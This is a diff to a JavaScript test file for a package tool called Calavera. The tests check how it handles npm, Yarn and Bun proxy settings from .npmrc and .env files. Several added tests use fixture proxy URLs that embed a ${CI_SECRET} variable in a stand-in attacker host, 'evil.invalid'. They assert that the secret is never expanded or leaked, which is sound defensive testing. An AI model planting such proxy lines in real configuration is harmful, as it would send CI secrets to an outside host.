@@ -440,7 +440,11 @@ test("under Bun, the .npmrc proxy settings are not used, because Bun does not re
     userAgent: BUN,
     files: { "home/.npmrc": "https-proxy=http://npm-proxy.example.com/\n" },
   });
-  assert.equal((await loadNpmRegistryOptions(context)).options.httpsProxy, undefined);
+  const result = await loadNpmRegistryOptions(context);
+  assert.equal(result.options.httpsProxy, undefined);
+  assert.deepEqual(result.warnings, [
+    "Ignored https-proxy in the user .npmrc: Bun does not read proxy settings from .npmrc files, so Calavera, which Bun runs, does not either. To use a proxy, set HTTPS_PROXY.",
+  ]);
 });
 
 test("an unparseable bunfig.toml is skipped with a warning that names the path and position, not the content", async () => {
@@ -1828,8 +1832,8 @@ test("when Bun runs Calavera, launcher variables from a .env file do not switch 
     "Ignored npm_execpath, which .env sets: Calavera recognizes the package manager that started it only from variables a package manager sets, so it reads the Bun settings, as Bun runs it. Remove npm_execpath from .env.",
     "Ignored npm_config_user_agent, which .env sets: Calavera recognizes the package manager that started it only from variables a package manager sets, so it reads the Bun settings, as Bun runs it. Remove npm_config_user_agent from .env.",
   ]);
-  // `bun run` sets both variables itself after it loads .env, so the values differ from the
-  // file's and are Bun's own.
+  // `bun run` sets both variables to Bun's own values after it loads .env, so the user agent
+  // names Bun and the .env lines do not matter.
   const bunRun = await fixture({
     files: {
       "workspace/project/.env": "npm_execpath=/x/npm-cli.js\nnpm_config_user_agent=npm/1\n",
@@ -1960,4 +1964,85 @@ test("when Bun runs Calavera and a package manager set its user agent, that pack
   const context = await fixture({ userAgent: YARN });
   const { registry } = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
   assert.equal(registry.origin, "https://registry.yarnpkg.com");
+});
+
+const NPM_STARTED_BUN = {
+  npm_execpath: "/usr/local/lib/node_modules/npm/bin/npm-cli.js",
+  npm_config_user_agent: "npm/11.20.0 node/v24.3.0 darwin arm64",
+};
+
+test("when npm starts Bun, an escaped variable that Bun unescaped in .env is not expanded into an npm proxy", async () => {
+  // Bun turns \${CI_SECRET} into the literal ${CI_SECRET}, which Calavera's environment layer
+  // would expand.
+  const context = await fixture({
+    files: {
+      "workspace/project/.env": "npm_config_https_proxy=http://\\${CI_SECRET}.evil.invalid:1/\n",
+    },
+    env: {
+      ...NPM_STARTED_BUN,
+      CI_SECRET,
+      npm_config_https_proxy: "http://${CI_SECRET}.evil.invalid:1/",
+    },
+  });
+  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
+  assert.equal(result.options.httpsProxy, undefined);
+  assert.match(
+    result.warnings.join("\n"),
+    /^Ignored npm_config_https_proxy, which \.env sets from a variable/m,
+  );
+  assertNoSecret(result, new RegExp(CI_SECRET));
+});
+
+test("under Yarn, an escaped variable that Yarn unescaped in .env.yarn is not expanded into the proxy", async () => {
+  const context = await fixture({
+    userAgent: YARN,
+    files: {
+      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://\\${CI_SECRET}.evil.invalid:1\n",
+    },
+    env: { CI_SECRET, YARN_HTTPS_PROXY: "http://${CI_SECRET}.evil.invalid:1" },
+  });
+  const result = await loadNpmRegistryOptions(context);
+  assert.equal(result.options.proxy, undefined);
+  assertNoSecret(result, new RegExp(CI_SECRET));
+});
+
+test("when npm starts Bun, a .env launcher variable that Bun did not apply keeps the npm settings", async () => {
+  // Bun keeps a variable the caller set, so npm's own npm_execpath stays.
+  const context = await fixture({
+    files: {
+      "home/.npmrc": "https-proxy=http://corp-proxy.example.com:1/\n",
+      "workspace/project/.env": "npm_execpath=whatever\n",
+    },
+    env: NPM_STARTED_BUN,
+  });
+  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
+  assert.equal(result.options.httpsProxy, "http://corp-proxy.example.com:1/");
+  assert.deepEqual(result.warnings, []);
+});
+
+test("when Bun runs Calavera with --env-file, the named files are judged too", async () => {
+  for (const execArgv of [["--env-file=other.env"], ["--env-file", "other.env"]]) {
+    const context = await fixture({
+      files: {
+        "workspace/project/other.env": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
+      },
+      env: { CI_SECRET, HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
+    });
+    const result = await loadNpmRegistryOptions({ ...context, runtime: "bun", execArgv });
+    assert.equal(typeof result.requestOptions.agent, "function", execArgv.join(" "));
+  }
+});
+
+test("under Bun, the note names each .npmrc proxy URL it skips, but not noproxy or an empty value", async () => {
+  const context = await fixture({
+    userAgent: BUN,
+    files: {
+      "home/.npmrc": "proxy=http://plain-proxy.example.com/\nnoproxy=internal.example.com\n",
+      "workspace/project/.npmrc": "https-proxy=\n",
+    },
+  });
+  const { warnings } = await loadNpmRegistryOptions(context);
+  assert.deepEqual(warnings, [
+    "Ignored proxy in the user .npmrc: Bun does not read proxy settings from .npmrc files, so Calavera, which Bun runs, does not either. To use a proxy, set HTTPS_PROXY.",
+  ]);
 });
